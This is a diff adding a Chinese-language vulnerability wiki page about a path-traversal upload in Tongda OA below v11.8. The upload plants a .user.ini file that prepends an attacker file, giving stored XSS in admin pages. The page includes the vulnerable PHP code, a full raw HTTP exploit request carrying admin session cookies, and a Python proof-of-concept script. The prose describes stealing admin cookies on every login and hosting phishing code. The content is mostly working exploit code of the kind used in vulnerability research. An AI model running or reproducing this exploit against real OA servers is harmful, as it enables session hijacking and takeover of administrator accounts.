@@ -1,0 +1,211 @@
+<h1 id="通达OA-v11-8-后台文件包含存储型XSS漏洞"><a href="#通达OA-v11-8-后台文件包含存储型XSS漏洞" class="headerlink" title="通达OA v11.8 后台文件包含存储型XSS漏洞"></a>通达OA v11.8 后台文件包含存储型XSS漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>通达OA v11.8以下存在文件上传接口，可上传 .user.ini 文件包含有xss语句的文件，使管理员后台文件均包含XSS语句，被攻击者获取敏感信息</p>
+<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><blockquote>
+<p>[!NOTE]</p>
+<p>通达OA &lt; v11.8</p>
+</blockquote>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://cdndown.tongda2000.com/oa/2019/TDOA11.6.exe" target="_blank" rel="noopener">通达OA v11.6下载链接</a></p>
+<p>下载完毕点击安装即可</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里使用的环境为通达 v11.6版本，v11.6版本中的漏洞利用较好，在 v11.7 后续版本中规定了上传路径，导致XSS利用会比较困难</p>
+<p>出现漏洞的文件为 <strong>webroot/general/hr/manage/staff_info/update.php</strong></p>
+<pre><code class="php">&lt;?php
+
+include_once &quot;inc/auth.inc.php&quot;;
+include_once &quot;inc/utility_all.php&quot;;
+include_once &quot;inc/utility_file.php&quot;;
+include_once &quot;inc/utility_field.php&quot;;
+include_once &quot;inc/utility_cache.php&quot;;
+include_once &quot;general/system/log/annual_leave_log.php&quot;;
+if (strstr($BYNAME, &quot;/&quot;) || strstr($BYNAME, &quot;\\&quot;) || strstr($BYNAME, &quot;..&quot;)) {
+    Message(_(&quot;错误&quot;), _(&quot;OA用户名包含非法字符！&quot;));
+    exit();
+}
+
+include_once &quot;inc/header.inc.php&quot;;
+echo &quot;\r\n&lt;body class=\&quot;bodycolor\&quot;&gt;\r\n&quot;;
+echo &quot;\r\n&lt;body class=\&quot;bodycolor\&quot;&gt;\r\n&quot;;
+$PHOTO_NAME0 = $_FILES[&quot;ATTACHMENT&quot;][&quot;name&quot;];
+$ATTACHMENT = $_FILES[&quot;ATTACHMENT&quot;][&quot;tmp_name&quot;];
+
+if ($PHOTO_NAME0 != &quot;&quot;) {
+    $FULL_PATH = MYOA_ATTACH_PATH . &quot;hrms_pic&quot;;
+
+    if (!file_exists($FULL_PATH)) {
+        @mkdir($FULL_PATH, 448);
+    }
+
+    $PHOTO_NAME = $USER_ID . substr($PHOTO_NAME0, strrpos($PHOTO_NAME0, &quot;.&quot;));
+    $FILENAME = MYOA_ATTACH_PATH . &quot;hrms_pic/&quot; . $PHOTO_NAME;
+    td_copy($ATTACHMENT, $FILENAME);
+
+    if (file_exists($ATTACHMENT)) {
+        unlink($ATTACHMENT);
+    }
+
+    if (!file_exists($FILENAME)) {
+        Message(_(&quot;附件上传失败&quot;), _(&quot;原因：附件文件为空或文件名太长，或附件大于30兆字节，或文件路径不存在！&quot;));
+        Button_Back();
+        exit();
+    }
+}
+</code></pre>
+<p><img src="http://wikioss.peiqi.tech/vuln/tongdaoa-30.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10"></p>
+<p>在这里参数 <strong>$USER_ID</strong> 是可控的，并且无过滤危险符号就拼接进去了，那我们传入 <strong>../../../</strong> 我们就可以任意文件上传了</p>
+<p>由于通达OA 的文件上传限制的死死的，所以我们可以通过利用 PHP的 <strong>.user.ini</strong> 文件来包含其他文件，这里是可以用于包含XSS语句的文件的，所以我们上传文件</p>
+<p>内容为</p>
+<pre><code>auto_prepend_file=test.log
+</code></pre>
+<p>我们想要最大化利用可以上传在<strong>首页或者管理员</strong> 界面，利用自定义弹窗来渗透</p>
+<p>这里对管理员页面 <strong>general</strong> 目录上传</p>
+<p>请求包为</p>
+<pre><code>POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/.user HTTP/1.1
+Host: 192.168.1.105
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104
+Content-Length: 365
+Connection: close
+Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31
+Upgrade-Insecure-Requests: 1
+
+-----------------------------17518323986548992951984057104
+Content-Disposition: form-data; name=&quot;ATTACHMENT&quot;; filename=&quot;peiqi.ini&quot;
+Content-Type: text/plain
+
+auto_prepend_file=peiqi.log
+-----------------------------17518323986548992951984057104
+Content-Disposition: form-data; name=&quot;submit&quot;
+
+提交
+-----------------------------17518323986548992951984057104--
+</code></pre>
+<p>其中 <strong>USER_ID=../../general/.user</strong> 为上传路径</p>
+<pre><code>Content-Disposition: form-data; name=&quot;ATTACHMENT&quot;; filename=&quot;peiqi.ini&quot;
+Content-Type: text/plain
+
+auto_prepend_file=peiqi.log
+</code></pre>
+<p>这里拼接后上传就变成了 <strong>.user.ini</strong></p>
+<p><img src="http://wikioss.peiqi.tech/vuln/tongdaoa-31.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10"></p>
+<p>这里再上传 XSS文件 <strong>peiqi.log</strong> 被包含进去</p>
+<p><img src="http://wikioss.peiqi.tech/vuln/tongdaoa-32.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10"></p>
+<p>上传后每次管理员登录后都会带着Cookie请求一次XSS平台</p>
+<p><img src="http://wikioss.peiqi.tech/vuln/tongdaoa-33.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10"></p>
+<p>钓鱼什么的代码写在peiqi.log文件里就好啦</p>
+<p>刚刚提到了 v11.7版本不方便利用，这是因为在后续版本加上了文件上传的规定路径</p>
+<p><img src="http://wikioss.peiqi.tech/vuln/tongdaoa-34.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10"></p>
+<pre><code class="php">if ((strpos($source, &quot;webroot&quot;) !== false) &amp;&amp; (strpos($source, &quot;attachment&quot;) === false)) {
+        return false;
+    }
+    else {
+        return true;
+    }
+</code></pre>
+<p>路径中必须要包含  <strong>webroot 和 attachment</strong> 才可以上传</p>
+<p><img src="http://wikioss.peiqi.tech/vuln/tongdaoa-35.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10"></p>
+<p> 这里XSS的利用点有4个文件夹，其中最有几率XSS的为<strong>存储目录管理的文件夹</strong></p>
+<p><img src="http://wikioss.peiqi.tech/vuln/tongdaoa-36.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10"></p>
+<p>用同样的方法上传利用文件，每次当管理员设置时就会盗取Cookie</p>
+<h2 id="漏洞利用POC"><a href="#漏洞利用POC" class="headerlink" title="漏洞利用POC"></a>漏洞利用POC</h2><blockquote>
+<p>因为是xss可能对目标有影响，所以这里POC在一个不常用目录探测是否存在漏洞</p>
+<p>Cookie填写访问后台时的Cookie, 其中的base64解码更改 PeiQi_Wiki为 自己的XSS语句</p>
+<p>v11.6及以下 攻击 /general 和 /general/system/attachment 目录较好</p>
+<p>v11.6以上 攻击  /general/system/attachment 目录较好</p>
+</blockquote>
+<pre><code class="python">import requests
+import sys
+import random
+import re
+import base64
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+def title():
+    print(&#39;+------------------------------------------&#39;)
+    print(&#39;+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m&#39;)
+    print(&#39;+  \033[34mVersion: 通达OA &lt; V11.8                                             \033[0m&#39;)
+    print(&#39;+  \033[36m使用格式:  python3 poc.py                                            \033[0m&#39;)
+    print(&#39;+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m&#39;)
+    print(&#39;+  \033[36mCookie      &gt;&gt;&gt; xxxxxxxxxxxxxxxxxxxxxx                             \033[0m&#39;)
+    print(&#39;+------------------------------------------&#39;)
+
+def POC_1(target_url, Cookie):
+    vuln_url = target_url + &quot;/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\workshop/report/attachment-remark/.user&quot;
+    headers = {
+        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;,
+        &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;,
+        &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;,
+        &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
+        &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------17518323986548992951984057104&quot;,
+        &quot;Connection&quot;: &quot;close&quot;,
+        &quot;Cookie&quot;: Cookie,
+        &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
+    }
+    data = base64.b64decode(&quot;LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==&quot;)
+    try:
+        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
+        print(&quot;\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \033[0m&quot;.format(target_url))
+        if &quot;档案已保存&quot; in response.text and response.status_code == 200:
+            print(&quot;\033[32m[o] 目标 {} 成功上传.user.ini文件, \033[0m&quot;.format(target_url))
+            POC_2(target_url, Cookie)
+        else:
+            print(&quot;\033[31m[x] 目标 {} 上传.user.ini文件失败\033[0m&quot;.format(target_url))
+            sys.exit(0)
+
+    except Exception as e:
+        print(&quot;\033[31m[x] 请求失败 \033[0m&quot;, e)
+
+def POC_2(target_url, Cookie):
+    vuln_url = target_url + &quot;/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\workshop/report/attachment-remark/test&quot;
+    headers = {
+        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;,
+        &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;,
+        &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;,
+        &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
+        &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------17518323986548992951984057104&quot;,
+        &quot;Connection&quot;: &quot;close&quot;,
+        &quot;Cookie&quot;:  Cookie,
+        &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
+    }
+    data = base64.b64decode(&quot;LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KClBlaVFpX1dpa2kKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=&quot;)
+    try:
+        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
+        print(&quot;\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/test \033[0m&quot;.format(target_url))
+        if &quot;档案已保存&quot; in response.text and response.status_code == 200:
+            print(&quot;\033[32m[o] 目标 {} 成功上传 test.log 文件, \033[0m&quot;.format(target_url))
+            POC_3(target_url, Cookie)
+        else:
+            print(&quot;\033[31m[x] 目标 {} 上传 test.log 文件失败\033[0m&quot;.format(target_url))
+            sys.exit(0)
+
+    except Exception as e:
+        print(&quot;\033[31m[x] 请求失败 \033[0m&quot;, e)
+
+def POC_3(target_url, Cookie):
+    vuln_url = target_url + &quot;/general/reportshop/workshop/report/attachment-remark/form.inc.php?test=test&quot;
+    headers = {
+        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;,
+        &quot;Cookie&quot;:  Cookie,
+    }
+    try:
+        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
+        print(&quot;\033[36m[o] 正在请求 {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?test=test \033[0m&quot;.format(target_url))
+        if &quot;test_Wiki&quot; in response.text and response.status_code == 200:
+            print(&quot;\033[32m[o] 目标 {} 存在漏洞，响应中包含 test_Wiki,存在XSS漏洞, 可参考文章写的利用版本进一步攻击 \033[0m&quot;.format(target_url))
+        else:
+            print(&quot;\033[31m[x] 目标 {} 不存在漏洞，响应中不包含 test_Wiki\033[0m&quot;.format(target_url))
+            sys.exit(0)
+    except Exception as e:
+        print(&quot;\033[31m[x] 请求失败 \033[0m&quot;, e)
+
+if __name__ == &#39;__main__&#39;:
+    title()
+    target_url = str(input(&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;))
+    Cookie = &quot;USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31&quot;
+    POC_1(target_url, Cookie)
+</code></pre>
+<p><img src="http://wikioss.peiqi.tech/vuln/tongdaoa-37.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10"></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://paper.seebug.org/1499/" target="_blank" rel="noopener">https://paper.seebug.org/1499/</a></p>
